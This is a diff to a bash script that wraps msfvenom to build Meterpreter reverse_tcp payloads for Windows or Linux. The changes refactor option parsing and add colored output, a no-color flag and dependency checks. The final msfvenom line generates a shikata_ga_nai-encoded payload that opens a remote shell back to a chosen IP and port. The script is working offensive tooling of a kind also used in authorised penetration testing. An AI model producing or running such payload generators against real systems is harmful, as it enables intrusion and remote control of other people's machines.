@@ -1,7 +1,26 @@
 #!/usr/bin/env bash
 
 default_ip() {
-    ip -o a | perl -lne 'if (/[^1]:.+inet ([^\/]+)/) {print $1; exit}'
+    ip -o a | \
+    perl -lne 'if (!/ lo / && /inet ([^\/]+)/) {print $1; exit}'
+}
+
+err() { echo -e "${color:+\e[31m}[!] $@\e[0m"; }
+
+errx() { echo -e "${color:+\e[31m}[!] ${@:2}\e[0m"; exit $1; }
+
+good() { echo -e "${color:+\e[32m}[+] $@\e[0m"; }
+
+info() { echo -e "${color:+\e[37m}[*] $@\e[0m"; }
+
+long_opt() {
+    local arg shift="0"
+    case "$1" in
+        "--"*"="*) arg="${1#*=}"; [[ -n $arg ]] || usage 1 ;;
+        *) shift="1"; shift; [[ $# -gt 0 ]] || usage 1; arg="$1" ;;
+    esac
+    echo "$arg"
+    return $shift
 }
 
 usage() {
@@ -14,6 +33,7 @@ usage() {
     echo "    -i, --ip=IP        Connect back to specified IP address"
     echo "                       (default: $ip)"
     echo "    -l, --linux        Create linux meterpreter"
+    echo "    --nocolor          Disable colorized output"
     echo "    -p, --port=PORT    Connect back to the specified port"
     echo "                       (default: $port)"
     echo "    -w, --windows      Create windows meterpreter (default"
@@ -33,31 +53,24 @@ usage() {
     exit $1
 }
 
-declare -a args
+warn() { echo -e "${color:+\e[33m}[-] $@\e[0m"; }
 
+declare -a args
+unset help
+color="true"
 ip="$(default_ip)"
 os="windows"
 port=4444
 
+# Parse command line options
 while [[ $# -gt 0 ]]; do
     case "$1" in
         "--") shift && args+=("$@") && break ;;
-        "-h"|"--help") usage 0 ;;
-        "-i"|"--ip"*)
-            case "$1" in
-                "--"*"="*) arg="${1#*=}"; [[ -n $arg ]] || usage 1 ;;
-                *) shift; [[ $# -gt 0 ]] || usage 1; arg="$1" ;;
-            esac
-            ip="$arg"
-            ;;
+        "-h"|"--help") help="true" ;;
+        "-i"|"--ip"*) ip="$(long_opt $@)" || shift ;;
         "-l"|"--linux") os="linux/x86" ;;
-        "-p"|"--port"*)
-            case "$1" in
-                "--"*"="*) arg="${1#*=}"; [[ -n $arg ]] || usage 1 ;;
-                *) shift; [[ $# -gt 0 ]] || usage 1; arg="$1" ;;
-            esac
-            port="$arg"
-            ;;
+        "--nocolor") unset color ;;
+        "-p"|"--port"*) port="$(long_opt $@)" || shift ;;
         "-w"|"--windows") os="windows" ;;
         *) args+=("$1") ;;
     esac
@@ -65,10 +78,13 @@ while [[ $# -gt 0 ]]; do
 done
 [[ -z ${args[@]} ]] || set -- "${args[@]}"
 
+# Check for valid params and missing dependencies
+[[ -z $help ]] || usage 0
 [[ $# -eq 1 ]] || usage 2
+for dep in msfvenom perl; do
+    [[ -n $(command -v $dep) ]] || errx 3 "$dep is not installed"
+done; unset dep
 
-format="$1" && shift
-
-msfvenom -b "\x00" -e x86/shikata_ga_nai -f $format \
-    -p $os/meterpreter/reverse_tcp LHOST=$ip LPORT=$port $@ \
-    >meterpreter.$format
+msfvenom -b "\x00" -e x86/shikata_ga_nai -f $1 \
+    -p $os/meterpreter/reverse_tcp LHOST=$ip LPORT=$port ${@:2} \
+    >meterpreter.$1
